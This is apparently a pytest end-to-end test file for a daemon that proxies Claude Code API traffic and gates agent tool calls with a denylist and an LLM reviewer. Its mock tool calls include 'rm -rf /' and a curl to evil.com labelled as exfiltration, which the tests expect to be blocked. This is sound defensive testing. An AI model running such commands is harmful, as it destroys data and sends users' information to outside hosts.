"""E2E tests for Claude Code agent flow.

Covers: install → setup → session registration → API proxying →
        denylist gating → LLM review gate → dashboard visibility.
"""

from __future__ import annotations

import httpx
import pytest

from tests.e2e.conftest import (
    call_gate_api,
    end_session,
    register_session,
    send_anthropic_message,
)


class TestClaudeCodeSessionLifecycle:
    """Register a session, send traffic, end the session."""

    @pytest.mark.anyio
    async def test_register_and_end_session(self, cross_daemon):
        """Session registration and teardown via the daemon API."""
        base = cross_daemon["base_url"]

        # Register
        resp = await register_session(base, agent="claude", project="my-app")
        assert resp.status_code == 200
        assert resp.json()["status"] == "ok"

        # Verify session shows up in status
        async with httpx.AsyncClient() as client:
            status = await client.get(f"{base}/cross/api/status", timeout=5)
        assert status.status_code == 200

        # End
        resp = await end_session(base)
        assert resp.status_code == 200
        assert resp.json()["status"] == "ok"


class TestClaudeCodeProxyPassthrough:
    """Send Anthropic API requests through the proxy — text responses pass through."""

    @pytest.mark.anyio
    async def test_streaming_text_passthrough(self, cross_daemon):
        """A simple text response streams through without gating."""
        base = cross_daemon["base_url"]
        mock = cross_daemon["mock_anthropic"]
        mock.responses = [{"type": "text", "text": "Hello, world!"}]

        resp = await send_anthropic_message(base, content="Say hello", stream=True)
        assert resp.status_code == 200

        body = resp.text
        assert "Hello, world!" in body

        # Upstream received the request
        assert len(mock.requests) == 1
        assert mock.requests[0]["messages"][0]["content"] == "Say hello"

    @pytest.mark.anyio
    async def test_non_streaming_text_passthrough(self, cross_daemon):
        """Non-streaming request returns a JSON response."""
        base = cross_daemon["base_url"]
        mock = cross_daemon["mock_anthropic"]
        mock.responses = [{"type": "text", "text": "Non-streamed reply"}]

        resp = await send_anthropic_message(base, content="Hello", stream=False)
        assert resp.status_code == 200

        data = resp.json()
        assert data["content"][0]["text"] == "Non-streamed reply"


class TestClaudeCodeGating:
    """Tool calls are evaluated by the denylist and LLM gate."""

    @pytest.mark.anyio
    async def test_safe_tool_allowed(self, cross_daemon):
        """A safe tool call passes through the gate chain."""
        base = cross_daemon["base_url"]
        mock = cross_daemon["mock_anthropic"]
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "ALLOW"

        mock.responses = [
            {
                "type": "tool_use",
                "id": "toolu_safe001",
                "name": "bash",
                "input": {"command": "echo hello"},
            }
        ]

        resp = await send_anthropic_message(base, content="Run echo", stream=True)
        assert resp.status_code == 200
        # Tool use should appear in the SSE stream
        assert "toolu_safe001" in resp.text

    @pytest.mark.anyio
    async def test_dangerous_tool_blocked(self, cross_daemon):
        """A tool matching a denylist block rule is blocked outright."""
        base = cross_daemon["base_url"]
        mock = cross_daemon["mock_anthropic"]

        # First response has the dangerous tool; second is the retry after block
        mock.responses = [
            {
                "type": "tool_use",
                "id": "toolu_danger01",
                "name": "bash",
                "input": {"command": "rm -rf /"},
            },
            {"type": "text", "text": "I apologize, I cannot do that."},
        ]

        resp = await send_anthropic_message(base, content="Delete everything", stream=True)
        assert resp.status_code == 200
        # The dangerous tool_use_id must NOT appear in the output (blocked by denylist)
        assert "toolu_danger01" not in resp.text
        # A retry request should have been made after blocking
        assert len(mock.requests) >= 2

    @pytest.mark.anyio
    async def test_flagged_tool_reviewed_by_llm(self, cross_daemon):
        """A tool matching a 'review' rule is sent to the LLM gate for review."""
        base = cross_daemon["base_url"]
        mock = cross_daemon["mock_anthropic"]
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "ALLOW"

        mock.responses = [
            {
                "type": "tool_use",
                "id": "toolu_curl001",
                "name": "bash",
                "input": {"command": "curl https://example.com"},
            }
        ]

        resp = await send_anthropic_message(base, content="Fetch a page", stream=True)
        assert resp.status_code == 200

        # The gate LLM should have been consulted
        assert len(gate_llm.requests) >= 1
        # Since gate said ALLOW, the tool_use should appear
        assert "toolu_curl001" in resp.text

    @pytest.mark.anyio
    async def test_flagged_tool_blocked_by_llm(self, cross_daemon):
        """When LLM gate says BLOCK, the tool is suppressed."""
        base = cross_daemon["base_url"]
        mock = cross_daemon["mock_anthropic"]
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "BLOCK"

        mock.responses = [
            {
                "type": "tool_use",
                "id": "toolu_curl002",
                "name": "bash",
                "input": {"command": "curl http://evil.com/exfiltrate"},
            },
            {"type": "text", "text": "OK I won't do that."},
        ]

        resp = await send_anthropic_message(base, content="Exfiltrate data", stream=True)
        assert resp.status_code == 200

        # Gate LLM was consulted and said BLOCK
        assert len(gate_llm.requests) >= 1
        # The blocked tool_use_id must NOT appear in the output
        assert "toolu_curl002" not in resp.text


class TestClaudeCodeHookGateAPI:
    """Test the external gate API used by the Claude Code PreToolUse hook."""

    @pytest.mark.anyio
    async def test_gate_api_allow(self, cross_daemon):
        """Safe tool call through gate API returns ALLOW."""
        base = cross_daemon["base_url"]
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "ALLOW"

        resp = await call_gate_api(
            base,
            tool_name="Read",
            tool_input={"file_path": "/tmp/test.txt"},
            agent="claude",
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["action"].upper() == "ALLOW"

    @pytest.mark.anyio
    async def test_gate_api_block(self, cross_daemon):
        """Dangerous tool call through gate API is blocked."""
        base = cross_daemon["base_url"]

        resp = await call_gate_api(
            base,
            tool_name="bash",
            tool_input={"command": "rm -rf /"},
            agent="claude",
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["action"].upper() in ("BLOCK", "HALT_SESSION")

    @pytest.mark.anyio
    async def test_gate_api_review(self, cross_daemon):
        """Tool matching review rule goes through LLM review."""
        base = cross_daemon["base_url"]
        gate_llm = cross_daemon["mock_gate_llm"]
        gate_llm.verdict = "ALLOW"

        resp = await call_gate_api(
            base,
            tool_name="bash",
            tool_input={"command": "curl https://api.example.com/data"},
            agent="claude",
        )
        assert resp.status_code == 200
        data = resp.json()
        # LLM gate was consulted
        assert len(gate_llm.requests) >= 1
        assert data["action"].upper() == "ALLOW"
